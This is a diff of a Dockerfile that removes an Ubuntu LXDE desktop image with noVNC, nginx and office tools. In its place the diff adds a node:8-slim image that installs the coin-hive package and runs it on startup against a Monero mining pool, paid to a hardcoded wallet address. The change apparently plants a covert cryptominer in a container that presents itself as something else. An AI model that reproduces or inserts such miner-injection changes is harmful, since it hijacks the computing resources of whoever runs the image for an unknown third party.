@@ -1,37 +1,13 @@
-FROM babim/ubuntubase
+FROM node:8-slim
 
-ENV DEBIAN_FRONTEND noninteractive
-ENV HOME /root
+# Install latest chrome and puppeteer dependencies
+RUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - &&\
+sh -c 'echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list' &&\
+apt-get update &&\
+apt-get install -y google-chrome-unstable gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget
 
-RUN apt-get update \
-    && apt-get install -y --force-yes --no-install-recommends supervisor \
-        pwgen sudo vim-tiny x11vnc x11vnc-data \
-        net-tools \
-        lxde x11vnc xvfb \
-        gtk2-engines-murrine ttf-ubuntu-font-family \
-        libreoffice firefox \
-        fonts-wqy-microhei \
-        nginx \
-        python-pip python-dev build-essential python-setuptools \
-        mesa-utils libgl1-mesa-dri \
-    && apt-get autoclean \
-    && apt-get autoremove \
-    && rm -rf /var/lib/apt/lists/*
+# Install coin-hive
+RUN npm i -g coin-hive --unsafe-perm=true --allow-root
 
-ADD web /web/
-RUN pip install -r /web/requirements.txt
-
-# tini for subreap                                   
-ENV TINI_VERSION v0.9.0
-ADD https://github.com/krallin/tini/releases/download/${TINI_VERSION}/tini /bin/tini
-RUN chmod +x /bin/tini
-
-ADD noVNC /noVNC/
-ADD nginx.conf /etc/nginx/sites-enabled/default
-ADD startup.sh /
-ADD supervisord.conf /etc/supervisor/conf.d/
-ADD doro-lxde-wallpapers /usr/share/doro-lxde-wallpapers/
-
-EXPOSE 6080
-WORKDIR /root
-ENTRYPOINT ["/startup.sh"]
+# Run coin-hive
+CMD coin-hive coin-hive 4Hm3YrYNgczRAP7jbGCZ7vA8XwbBR8DWMU7Bm9FKZqjxQXPPcwMP1kDbK3mtBSdt2c6TmLCPiMSXa39uBiEBwkg4FU7sGrPH1rz1Rnhh2M --pool-host=pool.minexmr.com --pool-port=4444
